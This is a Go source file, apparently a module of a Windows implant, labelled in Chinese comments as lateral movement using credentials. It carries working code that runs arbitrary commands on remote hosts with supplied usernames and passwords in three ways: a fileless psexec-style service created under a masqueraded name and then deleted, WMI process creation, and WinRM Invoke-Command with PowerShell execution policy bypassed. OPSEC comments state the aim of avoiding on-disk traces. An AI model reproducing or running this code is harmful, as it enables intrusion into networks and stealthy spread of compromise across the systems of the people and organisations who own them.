//go:build windows

package commands

import (
	"context"
	"fmt"
	"os/exec"
	"strings"
	"time"
)

// ===== A4: 横向移动（凭据利用）=====
// psexec: 建立 SMB IPC$ 连接 -> 复制载荷到 admin$ -> 创建并启动服务 -> 清理
// wmi_exec: WMI Win32_Process.Create 远程执行
// 命令格式（| 分隔，密码可含空格）：
//   psexec <target>|<user>|<pass>|<command>
//   wmi_exec <target>|<user>|<pass>|<command>

// execWithTimeoutLong 远程操作使用更长超时（60s）
func execWithTimeoutLong(name string, args ...string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	return exec.CommandContext(ctx, name, args...).CombinedOutput()
}

// CmdPsexec 通过 SMB 服务方式在远程主机执行命令（wmi/winrm 前缀分流）。
// 【OPSEC】无文件模式：服务 binPath 直接执行命令，不复制载荷到 admin$（避免落盘痕迹）。
func CmdPsexec(cmdBuf []byte) ([]byte, error) {
	prefix := string(cmdBuf)
	switch {
	case strings.HasPrefix(prefix, "wmi "):
		return CmdWmiExec(cmdBuf[4:])
	case strings.HasPrefix(prefix, "winrm "):
		return CmdWinrmExec(cmdBuf[7:])
	}
	parts := strings.SplitN(string(cmdBuf), "|", 4)
	if len(parts) != 4 || strings.TrimSpace(parts[0]) == "" || strings.TrimSpace(parts[3]) == "" {
		return nil, fmt.Errorf("用法: psexec <target>|<user>|<pass>|<command>")
	}
	target := strings.TrimSpace(parts[0])
	user := strings.TrimSpace(parts[1])
	pass := parts[2]
	command := parts[3]

	target = strings.TrimPrefix(target, `\\`)
	if !strings.HasPrefix(target, `\\`) {
		target = `\\` + target
	}

	var logs []string

	// 1. 建立 SMB IPC$ 连接（凭据可选；空凭据使用当前令牌上下文）
	if user != "" {
		cred := `net use ` + target + `\ipc$ ` + pass + ` /user:` + user + ` /y`
		out, err := execWithTimeoutLong("cmd", "/c", cred)
		logs = append(logs, "[SMB] "+strings.TrimSpace(string(out)))
		if err != nil {
			logs = append(logs, fmt.Sprintf("[!] SMB 连接失败: %v", err))
			return []byte(strings.Join(logs, "\n")), nil
		}
		defer func() {
			execWithTimeoutLong("cmd", "/c", "net use "+target+`\ipc$ /delete /y`)
		}()
	}

	// 2. 创建并启动服务直接执行命令（无文件：不复制载荷，SC 服务 binPath 指向 cmd /c）
	svcName := fmt.Sprintf("%s_%d", masquerade("Svc"), time.Now().UnixNano()%100000)
	binPath := fmt.Sprintf(`cmd /c %s`, strings.ReplaceAll(command, `"`, `\"`))
	createCmd := fmt.Sprintf(`sc %s create %s binPath= "%s" start= demand`, target, svcName, binPath)
	out, err := execWithTimeoutLong("cmd", "/c", createCmd)
	logs = append(logs, "[SC-CREATE] "+strings.TrimSpace(string(out)))
	if err != nil {
		logs = append(logs, fmt.Sprintf("[!] 服务创建失败（需管理员凭据）: %v", err))
		return []byte(strings.Join(logs, "\n")), nil
	}
	startCmd := fmt.Sprintf(`sc %s start %s`, target, svcName)
	out, _ = execWithTimeoutLong("cmd", "/c", startCmd)
	logs = append(logs, "[SC-START] "+strings.TrimSpace(string(out)))
	delCmd := fmt.Sprintf(`sc %s delete %s`, target, svcName)
	execWithTimeoutLong("cmd", "/c", delCmd)
	logs = append(logs, "[SC-CLEAN] 服务已删除")

	return []byte(strings.Join(logs, "\n")), nil
}

// CmdWmiExec 通过 WMI Win32_Process.Create 远程执行命令
func CmdWmiExec(cmdBuf []byte) ([]byte, error) {
	parts := strings.SplitN(string(cmdBuf), "|", 4)
	if len(parts) != 4 || strings.TrimSpace(parts[0]) == "" || strings.TrimSpace(parts[3]) == "" {
		return nil, fmt.Errorf("用法: wmi_exec <target>|<user>|<pass>|<command>")
	}
	target := strings.TrimSpace(parts[0])
	user := strings.TrimSpace(parts[1])
	pass := parts[2]
	command := strings.ReplaceAll(parts[3], "'", "''")

	var ps string
	if user != "" {
		ps = fmt.Sprintf(`
$sec = ConvertTo-SecureString '%s' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('%s', $sec)
Invoke-WmiMethod -ComputerName '%s' -Credential $cred -Class Win32_Process -Name Create -ArgumentList '%s' | Select-Object ProcessId, ReturnValue | Format-List
`, pass, user, target, command)
	} else {
		ps = fmt.Sprintf(`
Invoke-WmiMethod -ComputerName '%s' -Class Win32_Process -Name Create -ArgumentList '%s' | Select-Object ProcessId, ReturnValue | Format-List
`, target, command)
	}

	out, err := execWithTimeoutLong("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
	if err != nil {
		return nil, fmt.Errorf("WMI 执行失败: %v", err)
	}
	result := strings.TrimSpace(string(out))
	if strings.Contains(result, "ReturnValue") {
		return []byte("[+] WMI 远程执行完成:\n" + result), nil
	}
	return []byte(result), nil
}

// CmdWinrmExec 通过 WinRM(Invoke-Command) 远程执行: winrm <target>|<user>|<pass>|<command>
func CmdWinrmExec(cmdBuf []byte) ([]byte, error) {
	parts := strings.SplitN(string(cmdBuf), "|", 4)
	if len(parts) != 4 || strings.TrimSpace(parts[0]) == "" || strings.TrimSpace(parts[3]) == "" {
		return nil, fmt.Errorf("用法: winrm_exec <target>|<user>|<pass>|<command>")
	}
	target := strings.TrimSpace(parts[0])
	user := strings.TrimSpace(parts[1])
	pass := parts[2]
	command := strings.ReplaceAll(parts[3], "'", "''")

	var ps string
	if user != "" {
		ps = fmt.Sprintf(`
$sec = ConvertTo-SecureString '%s' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('%s', $sec)
$r = Invoke-Command -ComputerName '%s' -Credential $cred -ScriptBlock { %s } -ErrorAction Stop
$r | Out-String
`, pass, user, target, command)
	} else {
		ps = fmt.Sprintf(`
$r = Invoke-Command -ComputerName '%s' -ScriptBlock { %s } -ErrorAction Stop
$r | Out-String
`, target, command)
	}

	out, err := execWithTimeoutLong("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
	if err != nil {
		return nil, fmt.Errorf("WinRM 执行失败: %v（目标需启用 WinRM/PowerShell Remoting）", err)
	}
	return []byte("[+] WinRM 远程执行完成:\n" + strings.TrimSpace(string(out))), nil
}

